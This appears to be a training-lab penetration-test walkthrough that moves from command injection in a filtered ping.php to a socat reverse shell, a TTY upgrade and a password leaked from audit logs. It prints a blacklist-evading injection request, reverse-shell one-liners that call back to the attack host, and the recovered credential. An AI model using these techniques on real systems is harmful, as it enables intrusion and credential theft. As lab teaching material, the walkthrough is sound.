## Initial Access

### Context

External enumeration is complete and a wealth of findings have been documented. The engagement now shifts to gaining stable internal network access. The last confirmed position was remote code execution on `monitoring.inlanefreight.local` via OS command injection, with the `webdev` user executing commands through a filtered `ping.php` script.

***

### Getting a Reverse Shell via Socat

[Socat](https://linux.die.net/man/1/socat) is available on the target and is not blocked by the command filter. The base reverse shell command is:

```bash
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

To get this past the character and keyword blacklist, the command is broken up using single quotes and `$IFS` as a space substitute. Send the following request through [Burp Suite](https://portswigger.net/burp) Repeater:

```http
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Start a Netcat listener before sending the request:

```bash
nc -nvlp 8443
```

A shell connects back as `webdev`:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

***

### Upgrading to a Stable TTY with Socat

A raw Netcat shell cannot run commands like `su`, `sudo`, or `ssh` and does not support tab completion. Use [Socat](https://linux.die.net/man/1/socat) to upgrade to a fully interactive TTY. This approach is also covered in the [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) guide.

On the attack host, start a Socat listener:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

On the target host (through the existing Netcat shell), execute the Socat one-liner:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

The Socat listener on the attack host now has a fully interactive shell:

```
webdev@dmz01:/var/www/html/monitoring$ id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

***

### Privilege Escalation via Audit Log Leakage

The `id` output shows `webdev` is a member of the `adm` group. Members of the `adm` group can read all logs stored in `/var/log`, including audit logs. Use [aureport](https://linux.die.net/man/8/aureport) to parse the audit log for TTY input events:

```bash
aureport --tty | less
```

Output:

```
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

Type `q` to exit the pager. The log reveals a previous user typed a password directly into the terminal while attempting to authenticate as `srvadm`. This leaks the credential pair `srvadm:ILFreightnixadm!`.

***

### Switching to srvadm

Use `su` to authenticate as the `srvadm` user:

```bash
su srvadm
```

Enter the password `ILFreightnixadm!` when prompted. Spawn a proper bash shell:

```bash
/bin/bash -i
```

Confirm the context:

```
srvadm@dmz01:/var/www/html/monitoring$ id
uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
```

***

### Current Position and Next Steps

The current foothold is on `dmz01` as `srvadm`. The path taken to reach this point:

1. Command injection through a filtered `ping.php` script
2. Socat reverse shell bypassing keyword and character blacklists
3. TTY upgrade for a stable interactive session
4. Audit log enumeration via `adm` group membership revealing plaintext credentials
5. Lateral move to `srvadm` via credential reuse

Access must now be made persistent before moving further. The next step is to escalate privileges to `root` on this host and then establish persistence so the foothold is not lost.
